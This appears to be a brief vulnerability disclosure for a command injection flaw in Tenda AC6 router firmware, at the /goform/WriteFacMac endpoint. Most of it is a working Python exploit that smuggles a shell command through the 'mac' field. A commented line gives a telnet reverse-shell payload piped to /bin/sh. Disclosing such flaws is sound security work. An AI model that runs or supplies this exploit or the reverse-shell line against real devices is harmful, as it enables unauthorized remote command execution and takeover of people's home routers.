# AC6V1.0 V15.03.05.19 **Command Injection**

## Firmware information

Manufacturer's address:https://www.tenda.com.cn/

Firmware download address: https://www.tenda.com.cn/download/detail-2681.html

## Affected version

![image-20230812195503176](https://gitee.com/blogyoulin/img/raw/master/images/202308121955891.png)

## Vulnerability details

![image-20230812195524401](https://gitee.com/blogyoulin/img/raw/master/images/202308121955441.png)

In /goform/WriteFacMac, There is command injection

```
import requests
from pwn import*

ip = "192.168.182.111" #You Tenda AC6 Router IP
url = "http://" + ip + "/goform/WriteFacMac"
print(url)

#payload = ";cmd"
#payload = ";telnet ip port1 | /bin/sh | telnet ip port2"
payload =b';ls>/tmp/256.txt;'

cookie = {"Cookie":"password=ucwmji"}
data = {"mac": payload}
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
print("HackAttackSuccess!")
```

